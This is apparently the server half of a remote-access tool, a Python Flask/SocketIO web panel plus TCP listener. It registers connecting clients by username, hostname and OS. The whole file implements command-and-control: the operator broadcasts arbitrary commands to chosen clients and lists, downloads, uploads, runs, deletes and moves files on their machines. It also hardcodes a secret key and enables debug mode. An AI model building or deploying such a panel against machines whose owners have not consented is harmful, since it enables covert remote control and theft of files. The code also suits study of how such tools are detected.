import logging
import os
import webbrowser
from flask import Flask, render_template, request, send_file
from flask_socketio import SocketIO, emit
from gevent import spawn
from gevent.server import StreamServer
from gevent.lock import BoundedSemaphore
from collections import defaultdict
import base64
import json

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
app = Flask(__name__)
app.config['SECRET_KEY'] = 'Github_Brentlyw'
socketio = SocketIO(app, async_mode='gevent')

#Threadsafe dict
clients = defaultdict(dict)
clients_lock = BoundedSemaphore(1)

DELIMITER = '\0'

@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('connect')
def handle_websocket_connect():
    logging.info('WebSocket client connected')
    emit('client_list', list(get_serializable_clients()))

@socketio.on('disconnect')
def handle_websocket_disconnect():
    logging.info('WebSocket client disconnected')

@socketio.on('command')
def handle_command(data):
    command = data['command']
    target_clients = data['clients']
    logging.info(f"Received command from web: '{command}' for clients: {target_clients}")
    spawn(broadcast, command, target_clients)
    emit('output', f"Sent command to selected clients: {command}", broadcast=True)

@socketio.on('list_directory')
def handle_list_directory(data):
    client_id = data['client_id']
    path = data['path']
    command = f"LIST_DIR:{path}"
    spawn(broadcast, command, [client_id])

@socketio.on('download_file')
def handle_download_file(data):
    client_id = data['client_id']
    file_path = data['file_path']
    command = f"DOWNLOAD:{file_path}"
    spawn(broadcast, command, [client_id])
    
@socketio.on('run_file')
def handle_run_file(data):
    client_id = data['client_id']
    file_path = data['file_path']
    command = f"RUN:{file_path}"
    spawn(broadcast, command, [client_id])
    
@socketio.on('upload_file')
def handle_upload_file(data):
    client_id = data['client_id']
    file_path = data['file_path']
    file_content = data['file_content']
    command = f"UPLOAD:{file_path}:{file_content}"
    spawn(broadcast, command, [client_id])

@socketio.on('delete_file')
def handle_delete_file(data):
    client_id = data['client_id']
    file_path = data['file_path']
    command = f"DELETE:{file_path}"
    spawn(broadcast, command, [client_id])

@socketio.on('rename_file')
def handle_rename_file(data):
    client_id = data['client_id']
    old_path = data['old_path']
    new_path = data['new_path']
    command = f"RENAME:{old_path}:{new_path}"
    spawn(broadcast, command, [client_id])

@socketio.on('create_folder')
def handle_create_folder(data):
    client_id = data['client_id']
    folder_path = data['folder_path']
    command = f"CREATE_FOLDER:{folder_path}"
    spawn(broadcast, command, [client_id])

@socketio.on('move_file')
def handle_move_file(data):
    client_id = data['client_id']
    old_path = data['old_path']
    new_path = data['new_path']
    command = f"MOVE:{old_path}:{new_path}"
    spawn(broadcast, command, [client_id])

def handle_client(socket, address):
    reader = socket.makefile(mode='rb')
    writer = socket.makefile(mode='wb')
    formatted_addr = f"{address[0]}:{address[1]}"
    logging.info(f"New connection from {formatted_addr}")

    client_info = None
    try:
        while True:
            logging.debug(f"Waiting for message from {formatted_addr}")
            response = read_message(reader)
            if response:
                logging.debug(f"Received message from {formatted_addr}: {response}")
                if response.startswith("INFO:"):
                    client_info = handle_client_info(response[5:], address, writer)
                    with clients_lock:
                        clients[client_info['id']] = client_info
                    socketio.emit('client_list', list(get_serializable_clients()))
                elif ":" in response:
                    client_id, message = response.split(":", 1)
                    with clients_lock:
                        if client_id in clients:
                            if message.startswith("FILE_LIST:"):
                                try:
                                    file_list_json = message[9:].strip()
                                    file_list_json = file_list_json.lstrip(':')
                                    logging.debug(f"Attempting to parse JSON: {file_list_json}")
                                    file_list = json.loads(file_list_json)
                                    socketio.emit('file_list', file_list)
                                except json.JSONDecodeError as e:
                                    logging.error(f"Error decoding JSON: {e}")
                                    logging.error(f"Problematic JSON: {file_list_json}")
                                    socketio.emit('error', f"Error listing directory: {e}")
                            elif message.startswith("FILE_CONTENT:"):
                                _, file_name, content = message.split(":", 2)
                                socketio.emit('file_content', {'file_name': file_name, 'content': content})
                            elif message.startswith("OPERATION_RESULT:"):
                                try:
                                    result = json.loads(message[17:])
                                    socketio.emit('operation_result', result)
                                except json.JSONDecodeError as e:
                                    logging.error(f"Error decoding JSON: {e}")
                                    socketio.emit('error', f"Error processing operation result: {e}")
                            elif message.startswith("ERROR:"):
                                socketio.emit('error', message[6:])
                            else:
                                emit_message = f"Response from {clients[client_id]['username']}@{clients[client_id]['hostname']}:\n{message}"
                                socketio.emit('output', emit_message)
                        else:
                            logging.warning(f"Received message from unknown client ID: {client_id}")
                else:
                    logging.warning(f"Received unexpected message format from {formatted_addr}: {response}")
            else:
                logging.warning(f"No response from {formatted_addr}. Connection may be closed.")
                break
    except Exception as e:
        logging.error(f"Error with client {formatted_addr}: {e}", exc_info=True)
    finally:
        logging.info(f"Closing connection with {formatted_addr}")
        socket.close()
        if client_info:
            with clients_lock:
                clients.pop(client_info['id'], None)
            socketio.emit('client_list', list(get_serializable_clients()))
        logging.info(f"Connection with {formatted_addr} closed.")

def handle_client_info(info, addr, writer):
    try:
        username, hostname, client_id, os_info = info.split("|")
    except ValueError:
        logging.error(f"Malformed INFO message from {addr}: {info}")
        username, hostname, client_id, os_info = "Unknown", "Unknown", "Unknown", "Unknown"

    return {
        'username': username,
        'hostname': hostname,
        'ip': addr[0],
        'port': addr[1],
        'id': client_id,
        'os': os_info,
        'writer': writer
    }

def get_serializable_clients():
    with clients_lock:
        return [
            {
                'username': client['username'],
                'hostname': client['hostname'],
                'ip': client['ip'],
                'port': client['port'],
                'id': client['id'],
                'os': client['os']
            }
            for client in clients.values()
        ]

def send_message(writer, message, client_id):
    try:
        full_message = f"{message}{DELIMITER}"
        writer.write(full_message.encode('utf-8'))
        writer.flush()
        logging.debug(f"Sent message to client {client_id}: {message}")
    except Exception as e:
        logging.error(f"Error sending message to client {client_id}: {e}", exc_info=True)
        raise

def read_message(reader):
    try:
        message = b""
        while True:
            char = reader.read(1)
            if char == b'\0':
                break
            if not char:
                logging.debug("End of stream reached")
                return None
            message += char
        decoded_message = message.decode('utf-8').strip()
        logging.debug(f"Read message: {decoded_message}")
        return decoded_message
    except Exception as e:
        logging.error(f"Error reading message: {e}", exc_info=True)
    return None

def broadcast(message, target_clients):
    logging.info(f"Broadcasting message to {len(target_clients)} clients: '{message}'")
    for client_id in target_clients:
        with clients_lock:
            client = clients.get(client_id)
        if client:
            writer = client['writer']
            try:
                send_message(writer, message, client_id)
                logging.info(f"Broadcasted: '{message}' to {client['username']}@{client['hostname']}")
            except Exception as e:
                logging.error(f"Failed to send to {client_id}: {e}", exc_info=True)
                with clients_lock:
                    clients.pop(client_id, None)
                socketio.emit('client_list', list(get_serializable_clients()))
        else:
            logging.warning(f"Attempted to send message to non-existent client: {client_id}")

if __name__ == '__main__':
    host = 'localhost'
    web_port = 7878
    tcp_port = 7880

    script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)
    logging.info(f"Changed working directory to: {script_dir}")

    tcp_server = StreamServer((host, tcp_port), handle_client)
    spawn(tcp_server.serve_forever)
    logging.info(f"TCP server started on port {tcp_port}")

    webbrowser.open(f'http://{host}:{web_port}')
    logging.info(f"Opened WebUI in browser: http://{host}:{web_port}")

    socketio.run(app, host=host, port=web_port, debug=True, use_reloader=False)
